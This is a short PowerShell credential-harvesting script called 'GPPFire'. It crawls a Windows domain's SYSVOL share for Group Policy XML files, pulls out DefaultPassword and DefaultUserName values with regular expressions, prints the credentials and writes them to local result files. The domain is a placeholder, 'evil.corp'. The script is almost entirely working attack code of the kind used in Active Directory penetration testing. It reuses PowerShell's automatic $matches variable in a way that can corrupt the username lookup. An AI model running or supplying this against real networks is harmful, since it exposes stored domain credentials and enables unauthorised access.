#
# GPPFire - (GPP Passwords) - LiquidSky
# 
# Finds passwords in SYSVOL
# ________________________________

$domain = "evil.corp" #Add your dommain here
$sysvolRoot = "\\$domain\SYSVOL\$domain\"
$outputUserPass = "GPP_UserPass_Results.txt"
$outputKeywordHits = "GPP_Files_With_Keywords.txt"
$outputPasswordOnly = "GPP_PasswordOnly.txt"

Write-Host "`n[*] Scanning SYSVOL: $sysvolRoot`n"

$results = @()
$keywordFiles = @()
$passwordOnly = @()

$xmlFiles = Get-ChildItem -Path $sysvolRoot -Recurse -Filter *.xml -ErrorAction SilentlyContinue

foreach ($file in $xmlFiles) {
    $content = Get-Content -Raw -Path $file.FullName

    if ($content -match '(?i)(password|cpassword)') {
        $keywordFiles += $file.FullName
        Write-Host "[+] Keyword match in file: $($file.FullName)"
    }

    # Match multiple DefaultPassword entries, multiline-safe
    $regex = [regex]::new('(?is)<Registry.*?name="DefaultPassword".*?<Properties.*?value="([^"]+)"', 'IgnoreCase, Singleline')
    $matches = $regex.Matches($content)

    foreach ($match in $matches) {
        $password = $match.Groups[1].Value
        $username = ""

        # Try to find DefaultUserName (first one only — we can improve later)
        if ($content -match '(?is)<Registry.*?name="DefaultUserName".*?<Properties.*?value="([^"]+)"') {
            $username = $matches[1]
        }

        Write-Host "`n[*] Credential found in: $($file.FullName)"

        $results += "GPO File: $($file.FullName)"
        if ($username) {
            Write-Host "    Username: $username"
            $results += "    Username: $username"
        } else {
            Write-Host "    Username: [Not found]"
            $results += "    Username: [Not found]"
            $passwordOnly += $file.FullName
        }

        Write-Host "    Password: $password"
        $results += "    Password: $password"
        $results += ""
    }
}

# Write all results to disk
$results | Set-Content -Encoding UTF8 $outputUserPass
$keywordFiles | Sort-Object -Unique | Set-Content -Encoding UTF8 $outputKeywordHits
$passwordOnly | Sort-Object -Unique | Set-Content -Encoding UTF8 $outputPasswordOnly

Write-Host "`n[*] Done!"
Write-Host "    → Parsed user/pass saved to: $outputUserPass"
Write-Host "    → Files with 'password', 'Password', or 'cpassword' saved to: $outputKeywordHits"
Write-Host "    → Password found but NO username saved to: $outputPasswordOnly`n"
